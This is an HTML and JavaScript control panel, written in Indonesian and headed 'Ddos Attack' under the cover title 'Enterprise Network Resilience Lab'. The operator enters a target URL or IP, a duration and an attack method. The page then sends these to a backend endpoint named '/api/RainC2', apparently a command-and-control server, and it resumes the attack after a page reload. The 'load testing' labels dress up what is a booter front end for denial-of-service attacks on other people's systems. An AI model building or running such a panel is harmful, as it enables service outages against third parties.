<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enterprise Network Resilience Lab</title>
    <style>
        :root { --accent: #3b82f6; --bg: #09090b; --card: #18181b; --border: #27272a; --success: #22c55e; --error: #ef4444; }
        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; padding: 20px; line-height: 1.6; }
        .container { max-width: 1000px; margin: auto; background: var(--card); padding: 30px; border-radius: 12px; border: 1px solid var(--border); }
        .section { margin-bottom: 25px; padding: 20px; background: #111; border-radius: 10px; border: 1px solid var(--border); }
        h2 { margin-top: 0; font-size: 1.2rem; color: var(--accent); display: flex; align-items: center; gap: 10px; }
        label { display: block; margin-bottom: 8px; font-size: 13px; color: #a1a1aa; }
        textarea, input, select { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #3f3f46; background: #000; color: #fff; box-sizing: border-box; margin-bottom: 10px; }
        .btn-group { display: flex; gap: 10px; }
        button { flex: 1; padding: 12px; border-radius: 6px; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; color: white; }
        .btn-import { background: var(--success); }
        .btn-run { background: var(--accent); }
        .btn-stop { background: var(--error); display: none; }
        .btn-clear { background: #3f3f46; }
        button:hover { opacity: 0.8; transform: translateY(-1px); }
        .log-container { margin-top: 20px; }
        .log-box { background: #000; padding: 15px; border-radius: 8px; font-family: 'Consolas', monospace; height: 250px; overflow-y: auto; font-size: 12px; border: 1px solid var(--border); border-left: 4px solid var(--accent); }
        .status-bar { display: flex; justify-content: space-between; margin-top: 10px; font-size: 12px; color: #a1a1aa; background: #111; padding: 10px; border-radius: 6px; }
        .method-tag { background: #2d2d30; padding: 2px 6px; border-radius: 4px; font-size: 11px; }
    </style>
</head>
<body>

<div class="container">
    <header style="text-align: center; margin-bottom: 30px;">
        <h1>🛡 Ddos Attack</h1>
        <p style="color: #a1a1aa;">Sistem Pemantauan Performa dan Pengujian Beban Terdistribusi</p>
    </header>

    <div class="section">
        <h2>🔗 Bulk Resource Importer</h2>
        <label>Masukkan daftar URL API atau Method JS (Pisahkan dengan koma atau baris baru):</label>
        <textarea id="urls" placeholder="https://api.internal.com/v1/data.js&#10;https://api.internal.com/v2/data.js"></textarea>
        <div class="btn-group">
            <button class="btn-import" onclick="bulkFetch()">MUAT SEMUA RESOURCE</button>
            <button class="btn-clear" onclick="clearLogs()">BERSIHKAN LOG</button>
        </div>
    </div>

    <div class="section">
        <h2>🛠️ Execution Controller</h2>
        <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 15px;">
            <div>
                <label>Target Endpoint (URL/IP)</label>
                <input type="text" id="target" placeholder="https://target-infrastruktur-anda.com">
            </div>
            <div>
                <label>Durasi (Detik)</label>
                <input type="number" id="time" value="60">
            </div>
        </div>
        
        <label>Pilih Metode Analisis:</label>
        <select id="method">
                <option value="habibGMr9">habibGMr9 (Multi-Source Fetch)</option>
        </select>
        
        <div class="btn-group">
            <button id="run-btn" class="btn-run" onclick="startExecution()">MULAI PENGUJIAN BEBAN</button>
            <button id="stop-btn" class="btn-stop" onclick="stopExecution()">HENTIKAN PENGUJIAN</button>
        </div>
    </div>

    <div class="log-container">
        <div class="status-bar">
            <span>Status: <b id="system-status">IDLE</b></span>
            <span>Resource Terhubung: <b id="resource-count">0</b></span>
        </div>
        <div id="log" class="log-box"></div>
    </div>
</div>

<script>
    const logBox = document.getElementById('log');
    const runBtn = document.getElementById('run-btn');
    const stopBtn = document.getElementById('stop-btn');
    let importedResources = [];
    let executionTimer = null;

    function addLog(msg, type = 'info') {
        const time = new Date().toLocaleTimeString();
        let color = '#fff';
        if (type === 'success') color = '#4ade80';
        if (type === 'error') color = '#f87171';
        if (type === 'warn') color = '#fbbf24';
        
        logBox.innerHTML += `<div style="color: ${color}">[${time}] ${msg}</div>`;
        logBox.scrollTop = logBox.scrollHeight;
    }

    async function bulkFetch() {
        const input = document.getElementById('urls').value;
        const urls = input.split(/[\n,]+/).map(u => u.trim()).filter(u => u !== "");
        
        if (urls.length === 0) return addLog("Masukkan URL untuk diimpor!", "warn");

        addLog(`Memulai sinkronisasi ${urls.length} resource...`);
        document.getElementById('system-status').innerText = "SYNCING";

        const fetches = urls.map(async (url) => {
            try {
                const start = performance.now();
                const res = await fetch(url);
                if (!res.ok) throw new Error(`HTTP ${res.status}`);
                const end = performance.now();
                
                importedResources.push(url);
                addLog(`✓ Berhasil terhubung: ${url} (${(end - start).toFixed(0)}ms)`, "success");
            } catch (err) {
                addLog(`✗ Gagal: ${url} - ${err.message}`, "error");
            }
        });

        await Promise.all(fetches);
        document.getElementById('resource-count').innerText = importedResources.length;
        document.getElementById('system-status').innerText = "READY";
        addLog("Bulk Import Selesai.");
    }

    async function startExecution(isResume = false) {
        const target = document.getElementById('target').value;
        const method = document.getElementById('method').value;
        const time = document.getElementById('time').value;

        if (!target) return addLog("Tentukan target terlebih dahulu!", "warn");

        document.getElementById('system-status').innerText = "RUNNING";
        runBtn.style.display = 'none';
        stopBtn.style.display = 'block';

        if(!isResume) {
            const expiry = Date.now() + (parseInt(time) * 1000);
            localStorage.setItem('active_test', JSON.stringify({ target, method, time, expiry }));
            addLog(`Mengeksekusi metode <span class="method-tag">${method}</span> ke ${target} selama ${time} detik...`);
        } else {
            addLog(`Melanjutkan pengujian yang tertunda ke ${target}...`, "warn");
        }

        try {
            await fetch('/api/RainC2', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ target, method, time })
            });
            addLog("Instruksi berhasil dikirim ke kluster backend.", "success");
        } catch (err) {
            addLog("Gagal menghubungi backend server.", "error");
        }

        const remainingTime = isResume ? (JSON.parse(localStorage.getItem('active_test')).expiry - Date.now()) : (time * 1000);
        
        clearTimeout(executionTimer);
        executionTimer = setTimeout(() => {
            stopExecution(true);
        }, remainingTime);
    }

    function stopExecution(auto = false) {
        localStorage.removeItem('active_test');
        clearTimeout(executionTimer);
        
        document.getElementById('system-status').innerText = "IDLE";
        runBtn.style.display = 'block';
        stopBtn.style.display = 'none';
        
        if(auto) {
            addLog("Pengujian selesai secara otomatis sesuai durasi.", "success");
        } else {
            addLog("Pengujian dihentikan secara manual oleh pengguna.", "error");
        }
    }

    function checkPersistence() {
        const savedTest = localStorage.getItem('active_test');
        if (savedTest) {
            const data = JSON.parse(savedTest);
            if (Date.now() < data.expiry) {
                document.getElementById('target').value = data.target;
                document.getElementById('method').value = data.method;
                document.getElementById('time').value = data.time;
                startExecution(true);
            } else {
                localStorage.removeItem('active_test');
            }
        }
    }

    function clearLogs() {
        logBox.innerHTML = "";
        addLog("Console log dibersihkan.");
    }

    window.onload = checkPersistence;
</script>

</body>
</html>
